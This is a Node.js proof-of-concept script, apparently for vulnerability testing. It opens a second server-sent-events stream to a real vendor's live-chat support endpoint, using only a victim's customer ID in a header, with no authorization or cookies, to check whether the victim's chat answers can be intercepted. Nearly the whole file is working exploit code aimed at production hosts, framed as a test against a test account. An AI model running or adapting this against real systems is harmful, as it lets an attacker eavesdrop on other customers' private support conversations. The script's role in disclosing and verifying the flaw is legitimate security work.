// Attacker-side listener for the live-interception test.
// It opens a second SSE connection with the victim's cusId and does NOT send
// any chat POST. Run it, then send a question from the victim's browser.
//
// Run:
//   $env:CUS_ID="<test-account cusId>"
//   node listen-only.js
//
// Optional:
//   $env:BASE="https://support.bambulab.com"; $env:REGION="EN"
//   $env:MAX_WAIT="120"

const { ProxyAgent, fetch } = require('undici');

const BASE = process.env.BASE || 'https://support.bambulab.cn';
const REGION = (process.env.REGION || (BASE.includes('.cn') ? 'CN' : 'EN')).toUpperCase();
const CUS_ID = (process.env.CUS_ID || process.env.BBL_CUS_ID || '').trim();
const MAX_WAIT = parseInt(process.env.MAX_WAIT || '120', 10) * 1000;
const proxy = process.env.HTTPS_PROXY || process.env.HTTP_PROXY || 'http://127.0.0.1:7890';
const dispatcher = new ProxyAgent(proxy);
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function headers() {
  return {
    accept: 'text/event-stream',
    'cache-control': 'no-cache',
    pragma: 'no-cache',
    'x-accel-buffering': 'no',
    origin: BASE,
    referer: BASE + '/liveChat',
    'user-agent': UA,
    'x-robot-user': CUS_ID,
    'x-bbl-official-site-region': REGION,
  };
}

(async () => {
  if (!CUS_ID) {
    console.log('Set CUS_ID to the test account cusId.');
    console.log('Example: $env:CUS_ID="<cusId>"; node listen-only.js');
    process.exit(1);
  }

  const shortId = CUS_ID.slice(0, 4) + '...' + CUS_ID.slice(-4);
  console.log('SSE listener (no POST)');
  console.log('======================');
  console.log('Listening as: ' + shortId);
  console.log('Auth:         no Authorization header, no cookies');
  console.log('Action:       none; this script never sends a chat request');
  console.log('');
  console.log('Open the victim browser, send a question, and watch for events here.');
  console.log('If no events appear, the second stream did not receive the answer.');
  console.log('');

  const ctl = new AbortController();
  const res = await fetch(BASE + '/gw/robot/sse/connect', {
    headers: headers(),
    dispatcher,
    signal: ctl.signal,
  }).catch((e) => {
    console.log('connect error:', e.message);
    return null;
  });
  if (!res || !res.ok) {
    console.log('SSE status:', res ? res.status : 'no response');
    process.exit(1);
  }

  const reader = res.body.getReader();
  const dec = new TextDecoder();
  let buf = '';
  let events = 0;
  const deadline = Date.now() + MAX_WAIT;

  while (Date.now() < deadline) {
    const { done, value } = await reader.read();
    if (done) break;
    if (!value) continue;
    buf += dec.decode(value, { stream: true });
    const parts = buf.split(/\r?\n\r?\n/);
    buf = parts.pop();
    for (const part of parts) {
      for (const line of part.split(/\r?\n|\r/)) {
        if (!line.startsWith('data:')) continue;
        const x = line.slice(5).replace(/^ /, '');
        if (x === '[DONE]') {
          console.log('[' + new Date().toLocaleTimeString() + '] [DONE]');
          continue;
        }
        try {
          const j = JSON.parse(x);
          events++;
          const delta = j.delta ? String(j.delta).replace(/<br\s*\/?>/gi, '\n') : '';
          console.log('[' + new Date().toLocaleTimeString() + '] delta: ' + JSON.stringify(delta.slice(0, 300)));
        } catch {
          console.log('[' + new Date().toLocaleTimeString() + '] raw: ' + x.slice(0, 300));
        }
      }
    }
  }

  ctl.abort();
  console.log('');
  console.log('Events received: ' + events);
  if (events === 0) {
    console.log('No events received: the second stream did not receive the victim answer.');
  } else {
    console.log('Events received: the second stream received data while the victim was using the chat.');
  }
  process.exit(0);
})();